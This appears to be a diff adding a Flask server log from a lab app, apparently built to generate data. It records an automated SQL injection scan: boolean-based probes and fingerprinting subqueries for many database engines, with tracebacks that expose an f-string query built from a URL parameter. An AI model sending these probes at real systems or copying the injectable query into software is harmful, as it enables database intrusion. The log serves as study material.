@@ -1,0 +1,579 @@
+INFO:werkzeug: * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+DEBUG:web:/query/1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:39] "GET /query/1 HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:39] "[31m[1mPOST /query/1 HTTP/1.1[0m" 405 -
+DEBUG:web:/query/1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "GET /query/1 HTTP/1.1" 200 -
+DEBUG:web:/query/8971
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "GET /query/8971 HTTP/1.1" 200 -
+DEBUG:web:/query/1,'.")((.(.
+ERROR:web:Exception on /query/1,'.")((.(. [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near ",": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%2C%27.%22%29%28%28.%28. HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1'EaLMbC<'">aRGsLn
+ERROR:web:Exception on /query/1'EaLMbC<'">aRGsLn [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near "'EaLMbC<'": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%27EaLMbC%3C%27%22%3EaRGsLn HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1) AND 1677=6025 AND (2044=2044
+ERROR:web:Exception on /query/1) AND 1677=6025 AND (2044=2044 [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near ")": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%29%20AND%201677%3D6025%20AND%20%282044%3D2044 HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1) AND 9839=9839 AND (5865=5865
+ERROR:web:Exception on /query/1) AND 9839=9839 AND (5865=5865 [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near ")": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%29%20AND%209839%3D9839%20AND%20%285865%3D5865 HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND 9214=6303
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "GET /query/1%20AND%209214%3D6303 HTTP/1.1" 200 -
+DEBUG:web:/query/1 AND 9839=9839
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "GET /query/1%20AND%209839%3D9839 HTTP/1.1" 200 -
+DEBUG:web:/query/1 AND 4572=5001
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "GET /query/1%20AND%204572%3D5001 HTTP/1.1" 200 -
+DEBUG:web:/query/1 AND (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: MSysAccessObjects
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20CVAR%28NULL%29%20FROM%20MSysAccessObjects%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT TDESENCRYPT(NULL,NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT TDESENCRYPT(NULL,NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: TDESENCRYPT
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20TDESENCRYPT%28NULL%2CNULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT %SQLUPPER NULL) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT %SQLUPPER NULL) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near "%": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20%25SQLUPPER%20NULL%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT MD5(NULL~NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT MD5(NULL~NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near "~": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20MD5%28NULL~NULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT (NULL SETEQ NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT (NULL SETEQ NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near "SETEQ": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20%28NULL%20SETEQ%20NULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT CHR(82)||CHR(77)||CHR(116)||CHR(103) FROM SYSIBM.SYSDUMMY1)='RMtg'
+ERROR:web:Exception on /query/1 AND (SELECT CHR(82)||CHR(77)||CHR(116)||CHR(103) FROM SYSIBM.SYSDUMMY1)='RMtg' [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: SYSIBM.SYSDUMMY1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20CHR%2882%29%7C%7CCHR%2877%29%7C%7CCHR%28116%29%7C%7CCHR%28103%29%20FROM%20SYSIBM.SYSDUMMY1%29%3D%27RMtg%27 HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT NULLIF(USER,SESSION_USER) FROM SYSIBM.SYSDUMMY1) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT NULLIF(USER,SESSION_USER) FROM SYSIBM.SYSDUMMY1) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: SYSIBM.SYSDUMMY1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20NULLIF%28USER%2CSESSION_USER%29%20FROM%20SYSIBM.SYSDUMMY1%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT NULLIFZERO(hashcode(NULL))) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT NULLIFZERO(hashcode(NULL))) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: hashcode
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20NULLIFZERO%28hashcode%28NULL%29%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT 'RwRP' FROM RDB$DATABASE)='RwRP'
+ERROR:web:Exception on /query/1 AND (SELECT 'RwRP' FROM RDB$DATABASE)='RwRP' [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: RDB$DATABASE
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20%27RwRP%27%20FROM%20RDB%24DATABASE%29%3D%27RwRP%27 HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT 'fTUk' FROM INFORMATION_SCHEMA.IO_STATISTICS)='fTUk'
+ERROR:web:Exception on /query/1 AND (SELECT 'fTUk' FROM INFORMATION_SCHEMA.IO_STATISTICS)='fTUk' [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: INFORMATION_SCHEMA.IO_STATISTICS
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20%27fTUk%27%20FROM%20INFORMATION_SCHEMA.IO_STATISTICS%29%3D%27fTUk%27 HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT STRINGTOUTF8(NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT STRINGTOUTF8(NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: STRINGTOUTF8
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20STRINGTOUTF8%28NULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT CHAR(111)||CHAR(84)||CHAR(121)||CHAR(75) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='oTyK'
+ERROR:web:Exception on /query/1 AND (SELECT CHAR(111)||CHAR(84)||CHAR(121)||CHAR(75) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='oTyK' [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: INFORMATION_SCHEMA.SYSTEM_USERS
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20CHAR%28111%29%7C%7CCHAR%2884%29%7C%7CCHAR%28121%29%7C%7CCHAR%2875%29%20FROM%20INFORMATION_SCHEMA.SYSTEM_USERS%29%3D%27oTyK%27 HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT 'zOqg' FROM SYSMASTER:SYSDUAL)='zOqg'
+ERROR:web:Exception on /query/1 AND (SELECT 'zOqg' FROM SYSMASTER:SYSDUAL)='zOqg' [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near ":SYSDUAL": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20%27zOqg%27%20FROM%20SYSMASTER%3ASYSDUAL%29%3D%27zOqg%27 HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT ALPHA(NULL) FROM VERSIONS) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT ALPHA(NULL) FROM VERSIONS) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: VERSIONS
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:47] "[35m[1mGET /query/1%20AND%20%28SELECT%20ALPHA%28NULL%29%20FROM%20VERSIONS%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT TONUMBER(NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT TONUMBER(NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: TONUMBER
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20TONUMBER%28NULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT ASCII_CHAR(256) FROM SYSTEM.ONEROW) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT ASCII_CHAR(256) FROM SYSTEM.ONEROW) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: SYSTEM.ONEROW
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20ASCII_CHAR%28256%29%20FROM%20SYSTEM.ONEROW%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT CODE(NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT CODE(NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: CODE
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20CODE%28NULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT DIFFERENCE(NULL,NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT DIFFERENCE(NULL,NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: DIFFERENCE
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20DIFFERENCE%28NULL%2CNULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT QUARTER(NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT QUARTER(NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: QUARTER
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20QUARTER%28NULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT INSTR2(NULL,NULL) FROM DUAL) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT INSTR2(NULL,NULL) FROM DUAL) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such table: DUAL
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT QUOTE_IDENT(NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT QUOTE_IDENT(NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: QUOTE_IDENT
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20QUOTE_IDENT%28NULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
